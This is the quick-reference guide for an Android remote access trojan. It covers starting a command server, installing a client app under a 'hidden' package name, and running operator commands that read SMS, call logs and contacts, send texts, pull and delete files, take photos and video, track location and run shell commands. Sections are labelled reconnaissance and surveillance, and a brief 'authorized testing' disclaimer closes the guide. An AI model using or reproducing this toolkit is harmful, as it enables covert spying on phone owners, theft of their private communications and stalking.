# RAT System Quick Reference

## 🚀 Quick Start Commands

```bash
# Start server
cd Server_normad && python main.py --host 0.0.0.0 --port 1337

# Build & install client
cd Client_normad && ./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start -n com.hidden.client_normad/.MainActivity

# Connect to session
RAT> sessions
RAT> session 1
```

## 📋 Command Cheat Sheet

### 🔧 Basic Commands
```bash
ping                    # Test connection
device_info            # Get device information
sessions               # List active sessions (from RAT>)
session <id>           # Connect to session
back                   # Return to main prompt
exit                   # Exit server
```

### 📁 File Operations
```bash
file_dirs              # Get Android directories
file_list <path>       # List files in directory
file_download <file>   # Download file from device
file_upload <name:b64> # Upload file to device
file_delete <file>     # Delete file/directory

# Examples:
file_list /sdcard
file_list /storage/emulated/0/Download
file_download /sdcard/photo.jpg
file_delete /sdcard/temp.txt
```

### 📱 SMS & Communication
```bash
sms_read [limit]       # Read SMS messages
sms_send <num:msg>     # Send SMS message
call_log [limit]       # Get call history
contacts [limit]       # Get contact list

# Examples:
sms_read 20
sms_send +1234567890:Hello World
call_log 50
contacts 100
```

### 📸 Camera Operations
```bash
camera_info            # Get camera capabilities
camera_photo [id:qual] # Capture photo
camera_video_start [id:dur] # Start video recording
camera_video_stop      # Stop video recording

# Examples:
camera_photo           # Default camera, high quality
camera_photo 0:high    # Back camera, high quality
camera_photo 1:medium  # Front camera, medium quality
camera_video_start 0:60 # Record 60 seconds
```

### 🌍 Location Tracking
```bash
location_providers     # Check location services
location_get          # Get current location
location_start        # Start location tracking
location_stop         # Stop location tracking
```

### ⚙️ Shell Commands
```bash
shell_check           # Check shell access
shell_exec <command>  # Execute shell command
shell_system_info     # Get system information
shell_interactive <cmd:input> # Interactive command

# Examples:
shell_exec whoami
shell_exec pwd
shell_exec ls -la /sdcard
shell_exec ps aux
shell_exec df -h
shell_interactive cat:Hello World
```

## 🎯 Common Use Cases

### Device Reconnaissance
```bash
Session[1]> device_info        # Get device details
Session[1]> shell_system_info  # Get system info
Session[1]> location_get       # Get location
Session[1]> file_dirs          # Get directory structure
```

### File Exploration
```bash
Session[1]> file_list /sdcard
Session[1]> file_list /storage/emulated/0/DCIM/Camera
Session[1]> file_list /storage/emulated/0/Download
Session[1]> file_download /sdcard/important.txt
```

### Communication Access
```bash
Session[1]> sms_read 50        # Recent SMS
Session[1]> call_log 100       # Recent calls
Session[1]> contacts 200       # Contact list
```

### Surveillance
```bash
Session[1]> camera_photo       # Take photo
Session[1]> camera_video_start 0:120  # Record 2 minutes
Session[1]> location_start     # Track location
```

### System Control
```bash
Session[1]> shell_exec whoami
Session[1]> shell_exec ps aux | grep -i camera
Session[1]> shell_exec netstat -an
Session[1]> shell_exec cat /proc/version
```

## 🔍 Troubleshooting Quick Fixes

### Connection Issues
```bash
# Check if server is running
netstat -an | grep 1337

# Check if client is connected
RAT> sessions

# Restart client
adb shell am force-stop com.hidden.client_normad
adb shell am start -n com.hidden.client_normad/.MainActivity
```

### Permission Issues
```bash
# Check what permissions are denied
Session[1]> sms_read
# If error: Grant SMS permissions in Android settings

Session[1]> camera_photo
# If error: Grant camera permissions in Android settings

Session[1]> location_get
# If error: Grant location permissions and enable GPS
```

### Command Not Working
```bash
# Test basic connectivity
Session[1]> ping

# Check if session is still active
RAT> sessions

# Try simpler command first
Session[1]> shell_exec echo "test"
```

## 📊 Response Formats

### Success Response
```json
{
  "status": "success",
  "command": "command_name",
  "timestamp": 1751234567890,
  "data": { /* command-specific data */ }
}
```

### Error Response
```json
{
  "status": "error",
  "message": "Error description",
  "timestamp": 1751234567890
}
```

## 🛡️ Security Checklist

### Before Deployment
- [ ] Ensure you have authorization for target device
- [ ] Verify network security (VPN/tunnel if needed)
- [ ] Check local laws and regulations
- [ ] Configure appropriate logging
- [ ] Set up access controls

### During Operation
- [ ] Monitor connection logs
- [ ] Respect privacy and data protection
- [ ] Use minimum necessary permissions
- [ ] Clean up temporary files
- [ ] Document all activities

### After Operation
- [ ] Remove client if temporary testing
- [ ] Secure or delete collected data
- [ ] Review logs for any issues
- [ ] Document findings appropriately

## 🔗 Quick Links

- **Full Documentation**: [USAGE_GUIDE.md](USAGE_GUIDE.md)
- **All Commands**: [COMMAND_REFERENCE.md](COMMAND_REFERENCE.md)
- **Deployment**: [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)
- **Architecture**: [PROJECT_STRUCTURE.md](PROJECT_STRUCTURE.md)

## 📞 Emergency Commands

```bash
# Stop all tracking
Session[1]> location_stop
Session[1]> camera_video_stop

# Disconnect client
Session[1]> back
RAT> exit

# Force stop client (via ADB)
adb shell am force-stop com.hidden.client_normad

# Kill server process
pkill -f "python.*main.py"
```

---

**Remember**: This tool is for educational and authorized testing only. Always ensure proper authorization and legal compliance.
